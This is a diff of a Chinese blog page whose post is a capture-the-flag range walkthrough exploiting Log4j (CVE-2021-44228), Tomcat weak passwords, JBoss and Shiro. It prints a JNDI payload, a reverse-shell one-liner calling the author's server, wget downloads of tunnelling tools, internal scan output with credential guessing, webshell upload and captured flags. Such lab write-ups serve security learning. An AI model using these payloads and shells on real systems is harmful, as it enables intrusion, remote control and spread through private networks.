@@ -1,114 +1,289 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
-
 <head>
-  <head>
   <meta charset="utf-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <meta name="author" content="viggo" />
-  <title>greetdawn&#39;s Blog - The God love people</title>
-  <meta name="keywords" content="Web安全,Linux,Python,Life">
-  <meta name="description" content="Love coding,Love life!">
-  <link rel="shortcut icon" href="/favicon.ico">
   
-<link rel="stylesheet" href="/css/hclonely.css">
-<link rel="stylesheet" href="//fonts.loli.net/css?family=Arimo:400,700,400italic.css">
-<link rel="stylesheet" href="/css/fonts/linecons/css/linecons.min.css">
-<link rel="stylesheet" href="/css/fonts/fontawesome/css/all.min.css">
-<link rel="stylesheet" href="/css/bootstrap.min.css">
-<link rel="stylesheet" href="/css/xenon-core.min.css">
-<link rel="stylesheet" href="/css/xenon-components.min.css">
-<link rel="stylesheet" href="/css/xenon-skins.min.css">
-<link rel="stylesheet" href="/css/nav.min.css">
-
+  <title>第三期cfs靶场练习 | greetdawn&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="payload&#x3D;$&amp;#123;jndi:ldap:&#x2F;&#x2F;4o5zj6.dnslog.cn&#x2F;cxvahp&amp;#125; vps：139.196.234.164 bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;139.196.234.164&#x2F;5555 0&gt;&amp;1  Apache log4j2漏洞(CVE-2021-44228)10.134.110.23:8080 flag1: flag{ee5645">
+<meta property="og:type" content="article">
+<meta property="og:title" content="第三期cfs靶场练习">
+<meta property="og:url" content="http://www.greetdawn.top/2021/12/07/%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F/xiyu-new-bachang-cfs/index.html">
+<meta property="og:site_name" content="greetdawn&#39;s Blog">
+<meta property="og:description" content="payload&#x3D;$&amp;#123;jndi:ldap:&#x2F;&#x2F;4o5zj6.dnslog.cn&#x2F;cxvahp&amp;#125; vps：139.196.234.164 bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;139.196.234.164&#x2F;5555 0&gt;&amp;1  Apache log4j2漏洞(CVE-2021-44228)10.134.110.23:8080 flag1: flag{ee5645">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211216151433833.png">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211216151543166.png">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211216164224261.png">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211216172919652.png">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211216184338762.png">
+<meta property="article:published_time" content="2021-12-07T03:12:47.000Z">
+<meta property="article:modified_time" content="2021-12-23T10:59:08.210Z">
+<meta property="article:author" content="丨greetdawn丨">
+<meta property="article:tag" content="Web安全,Linux,Python,Life">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211216151433833.png">
   
-<script src="/js/jquery-1.11.1.min.js"></script>
-
-  <script>
-    var userDefinedSearchData = {"custom":false,"thisSearch":"https://www.baidu.com/s?wd=","thisSearchIcon":"url(https://www.baidu.com/favicon.ico)","hotStatus":true,"data":[{"name":"百度","img":"url(https://www.baidu.com/favicon.ico)","url":"https://www.baidu.com/s?wd="}]};
-    var expandAll = false;
-  </script>
-  
-<script src="/js/header.js"></script>
-
-  <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
-  <!--[if lt IE 9]>
-        
-<script src="/js/html5shiv.min.js"></script>
-
-        
-<script src="/js/respond.min.js"></script>
-
-    <![endif]-->
-  <!-- / FB Open Graph -->
-  <meta property="og:type" content="article">
-  <meta property="og:url" content="http://www.greetdawn.top/2021/12/07/%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F/xiyu-new-bachang-cfs/index.html">
-  <meta property="og:title" content="greetdawn&#39;s Blog - The God love people">
-  <meta property="og:description" content="Love coding,Love life!">
-  <meta property="og:site_name" content="greetdawn&#39;s Blog - The God love people">
-  
-  <meta property="og:image" content="/images/webstack_banner_cn.png">
-  
-  <!-- / Twitter Cards -->
-  <meta name="twitter:card" content="summary_large_image">
-  <meta name="twitter:title" content="greetdawn&#39;s Blog - The God love people">
-  <meta name="twitter:description" content="Love coding,Love life!">
-  
-  <meta name="twitter:image" content="/images/webstack_banner_cn.png">
+    <link rel="alternate" href="/atom.xml" title="greetdawn's Blog" type="application/atom+xml">
   
   
-  <!-- 直接添加html内容即可 -->
-<!-- 可设置多行 -->
+    <link rel="shortcut icon" href="/favicon.ico">
   
-<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="greetdawn's Blog" type="application/atom+xml">
-</head>
+  
+<link rel="stylesheet" href="/css/typing.css">
 
-</head>
+  
+<link rel="stylesheet" href="/css/donate.css">
 
-
-
-
-  <footer class="main-footer sticky footer-type-1">
-  <div class="footer-inner">
-    <!-- Add your copyright text here -->
-    <p>
-      
-      &copy; 2020 - 2022
-      <a href="javascript:void(0);"><strong>丨greetdawn丨</strong></a> | Design by <a href="http://viggoz.com" target="_blank"><strong>Viggo</strong></a> | Power by <a href="https://hexo.io/" target="_blank"><strong>Hexo</strong></a> & <a href="https://github.com/HCLonely/hexo-theme-webstack/" target="_blank"><strong>hexo-theme-webstack</strong></a>
-    </p>
+  
+  
     
-    <div class="go-up">
-      <a href="#" rel="go-top">
-        <i class="fas fa-angle-up"></i>
-      </a>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+  
+    
+      <body>
+    
+  
+      <div id="container" class="container">
+        <article id="post-综合渗透/xiyu-new-bachang-cfs" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <header id="header" class="header">
+  <nav class="mobile-nav">
+    <h1 class="nickname">NickName</h1>
+    <ul class="mobile-nav-menu">
+      <label for="mobile-menu-toggle"><a id="menu-button">&#9776; Menu</a></label>
+      <input type="checkbox" id="mobile-menu-toggle"/>
+      <ul class="mobile-nav-link">
+        
+        <a href="/">Home</a>
+        
+        <a href="/archives">Archives</a>
+        
+        <a href="/about">About</a>
+        
+      </ul>
+    </ul>
+  </nav>
+	
+		<nav id="main-nav" class="main-nav nav-left">
+	
+	
+	  <a class="main-nav-link" href="/">Home</a>
+	
+	  <a class="main-nav-link" href="/archives">Archives</a>
+	
+	  <a class="main-nav-link" href="/about">About</a>
+	
+  </nav>
+</header>
+
+  <hr/>
+  <div class="article-inner">
+    
+
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      第三期cfs靶场练习
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry typo" itemprop="articleBody">
+      
+        <pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">payload</span><span class="token operator">=</span><span class="token variable">$&#123;jndi<span class="token operator">:</span>ldap<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>4o5zj6.dnslog.cn<span class="token operator">/</span>cxvahp&#125;</span>
+vps：139.196.234.164
+<span class="token function">bash</span> -i <span class="token operator">>&amp;</span> /dev/tcp/139.196.234.164/5555 <span class="token operator"><span class="token file-descriptor important">0</span>></span><span class="token file-descriptor important">&amp;1</span></code></pre>
+
+<h1 id="Apache-log4j2漏洞-CVE-2021-44228"><a href="#Apache-log4j2漏洞-CVE-2021-44228" class="headerlink" title="Apache log4j2漏洞(CVE-2021-44228)"></a>Apache log4j2漏洞(CVE-2021-44228)</h1><p>10.134.110.23:8080</p>
+<h2 id="flag1-flag-ee5645e88bd351505554be5016ef505e"><a href="#flag1-flag-ee5645e88bd351505554be5016ef505e" class="headerlink" title="flag1: flag{ee5645e88bd351505554be5016ef505e}"></a>flag1: flag{ee5645e88bd351505554be5016ef505e}</h2><p><strong>第一步：</strong></p>
+<pre class="language-none"><code class="language-none">payload&#x3D;$&#123;jndi:ldap:&#x2F;&#x2F;139.196.234.164:1389&#x2F;TomcatBypass&#x2F;Command&#x2F;Base64&#x2F;YmFzaCAtaSA%252BJiAvZGV2L3RjcC8xMzkuMTk2LjIzNC4xNjQvNTU1NSAwPiYx&#125;</code></pre>
+
+<p>注：后面command需要经过一次base64编码，两次URL编码处理</p>
+<pre class="language-none"><code class="language-none">command: bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;139.196.234.164&#x2F;5555 0&gt;&amp;1</code></pre>
+
+
+
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211216151433833.png"></p>
+<p><strong>第二步：</strong></p>
+<ul>
+<li>vps监听</li>
+</ul>
+<pre class="language-none"><code class="language-none">nc -lvvp 5555</code></pre>
+
+<ul>
+<li>开启恶意ldap服务</li>
+</ul>
+<pre class="language-none"><code class="language-none">java -jar JNDIExploit-1.2-SNAPSHOT.jar -i &quot;139.196.234.164&quot; -p 8080</code></pre>
+
+<p>成功上线</p>
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211216151543166.png" alt="image-20211216151543166"></p>
+<p>10.134.110.23 内网探测</p>
+<pre class="language-none"><code class="language-none">root@66f6d6f3234c:&#x2F;tmp# .&#x2F;fscan_amd64 -h 10.134.0.0&#x2F;16
+.&#x2F;fscan_amd64 -h 10.134.0.0&#x2F;16
+
+   ___                              _
+  &#x2F; _ \     ___  ___ _ __ __ _  ___| | __
+ &#x2F; &#x2F;_\&#x2F;____&#x2F; __|&#x2F; __| &#39;__&#x2F; _&#96; |&#x2F; __| |&#x2F; &#x2F;
+&#x2F; &#x2F;_\\_____\__ \ (__| | | (_| | (__|   &lt;
+\____&#x2F;     |___&#x2F;\___|_|  \__,_|\___|_|\_\
+                     fscan version: 1.6.3
+start infoscan
+(icmp) Target &#39;10.134.110.23&#39; is alive
+(icmp) Target &#39;10.134.110.1&#39; is alive
+(icmp) Target &#39;10.134.110.26&#39; is alive
+(icmp) Target &#39;10.134.110.34&#39; is alive
+icmp alive hosts len is: 4
+10.134.110.34:8093 open
+10.134.110.1:22 open
+10.134.110.34:8083 open
+10.134.110.34:8080 open
+10.134.110.26:8080 open
+10.134.110.1:8080 open
+10.134.110.23:8080 open
+10.134.110.34:8009 open
+10.134.110.26:8009 open
+alive ports len is: 9
+start vulscan
+[*] WebTitle:http:&#x2F;&#x2F;10.134.110.34:8080 code:200 len:1507   title:Welcome to JBos                                                                                                                                                             s&amp;trade;
+[*] WebTitle:http:&#x2F;&#x2F;10.134.110.23:8080 code:404 len:0      title:None
+[*] WebTitle:http:&#x2F;&#x2F;10.134.110.1:8080  code:404 len:0      title:None
+[+] InfoScan:http:&#x2F;&#x2F;10.134.110.23:8080 [SprintBoot]
+[*] WebTitle:http:&#x2F;&#x2F;10.134.110.26:8080 code:200 len:20     title:Apache Tomcat&#x2F;8                                                                                                                                                             .0.43
+[+] InfoScan:http:&#x2F;&#x2F;10.134.110.34:8080 [Jboss JBOSS]
+[*] WebTitle:http:&#x2F;&#x2F;10.134.110.34:8083 code:400 len:0      title:None
+[+] InfoScan:http:&#x2F;&#x2F;10.134.110.1:8080  [SprintBoot]
+[+] http:&#x2F;&#x2F;10.134.110.26:8080&#x2F;manager&#x2F;html tomcat tomcat
+[+] http:&#x2F;&#x2F;10.134.110.26:8080 poc-yaml-tomcat-manager-week
+已完成 8&#x2F;9 [-] ssh 10.134.110.1:22 root 123456789 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain
+已完成 8&#x2F;9 [-] ssh 10.134.110.1:22 admin admin123 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain
+已完成 8&#x2F;9 [-] ssh 10.134.110.1:22 admin 123321 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain
+已完成 9&#x2F;9
+scan end</code></pre>
+
+<p> 部署frp内网穿透工具</p>
+<p>使用wget上传文件至外网机</p>
+<p>wget <a target="_blank" rel="noopener" href="http://139.196.234.164:8000/frpc">http://139.196.234.164:8000/frpc</a></p>
+<p>wget <a target="_blank" rel="noopener" href="http://139.196.234.164:8000/frpc.ini">http://139.196.234.164:8000/frpc.ini</a></p>
+<p>frp连接</p>
+<p>server:./frps -c frps.ini</p>
+<p>client:./frpc -c frpc.ini</p>
+<p>10.134.110.26:8080 存在toamcat弱口令部署war包</p>
+<p>上传蚁剑马</p>
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211216164224261.png" alt="image-20211216164224261"></p>
+<p>flag3： flag{a457f1dd3623a399d78a9672d225ddd5}</p>
+<p>10.134.110.34:8080 JBOSS 命令执行</p>
+<p>flag4：flag{4b0e8838ced75dbb359414892942d19d}</p>
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211216172919652.png" alt="image-20211216172919652"></p>
+<p>172.78.69.16</p>
+<p>172.78.69.15:8080 存在shire反序列化漏洞</p>
+<p>flag2: flag{b2a0b3a262c1234132672229af281ed6}</p>
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211216184338762.png" alt="image-20211216184338762"></p>
+
+      
+      
     </div>
+    <footer class="article-footer">
+      <ul class="article-meta">
+        <li>
+          <span class="label">Published Date:</span>
+          <a href="/2021/12/07/%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F/xiyu-new-bachang-cfs/" class="article-date">
+  <time class="dt-published" datetime="2021-12-07T03:12:47.000Z" itemprop="datePublished">2021-12-07</time>
+</a>
+
+        </li>
+        
+        
+        <hr/>
+      </ul>
+    </footer>
   </div>
-</footer>
-</div>
-</div>
+  
+    
+<nav id="article-nav" class="article-nav">
+  
+    <a href="/2021/12/11/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/log4j2RCE-CVE-2021-44228/" id="article-nav-newer" class="article-nav-link-wrap newer">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          log4j2RCE(CVE-2021-44228)漏洞利用与分析
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2021/12/06/web-security/php-code-audit/php-unserialize-getflag/" id="article-nav-older" class="article-nav-link-wrap older">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">php-unserialize-getflag</div>
+    </a>
+  
+</nav>
 
-<script src="/js/bootstrap.min.js"></script>
-<script src="/js/TweenMax.min.js"></script>
-<script src="/js/resizeable.min.js"></script>
-<script src="/js/joinable.js"></script>
-<script src="/js/xenon-api.min.js"></script>
-<script src="/js/xenon-toggles.min.js"></script>
-<script src="/js/xenon-custom.min.js"></script>
 
-
-<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+</article>
 
 
 
-<script src="/js/lozad.min.js"></script>
+
+
+
+
+
+
+
+      </div>
+      
+    <footer id="footer" class="post-footer footer">
+      
+      <hr/>
+      <div id="footerContent" class="footer-content">
+        <p>ipsum dolor sit amet, <strong>consectetur adipiscing elit.</strong> Fusce eget urna vitae velit <em>eleifend interdum at ac nisi. In nec ligula lacus. Cum sociis natoque</em> penatibus et magnis dis parturient montes, nascetur ridiculus mus. Sed eu cursus erat, ut dapibus quam. Post</p>
+
+
+      </div>
+    </footer>
+
+      
+
+
+
+
+
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
 
 
 
   
-  <!-- 直接添加html内容即可 -->
-<!-- 可设置多行 -->
-  
-</body>
+<script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
 
+
+
+
+<script src="/js/typing.js"></script>
+
+<!--[if lt IE 9]>
+<script src="https://cdn.jsdelivr.net/npm/html5shiv@3/dist/html5shiv.min.js"></script>
+<![endif]-->
+
+
+
+
+
+
+
+    </div>
+  </body>
 </html>
